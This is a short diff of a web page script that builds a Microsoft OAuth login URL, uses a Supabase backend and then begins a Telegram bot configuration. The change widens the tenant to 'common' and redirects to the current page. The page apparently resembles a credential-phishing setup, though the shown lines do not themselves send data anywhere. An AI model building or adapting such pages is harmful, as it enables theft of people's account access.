@@ -120,8 +120,8 @@
         const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         const clientId = 'f7b9446e-dc65-4980-8af0-db5743fae01f';
-        const tenantId = 'd233b14c-1f16-4261-b0a9-7c5d3ce27b54';
-        const redirectUri = encodeURIComponent(https://blackkom.github.io/9013351951/);
+        const tenantId = 'common';
+        const redirectUri = encodeURIComponent(window.location.href);
         const authUrl = `https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${redirectUri}&scope=openid profile email`;
 
         // Telegram Bot Configuration
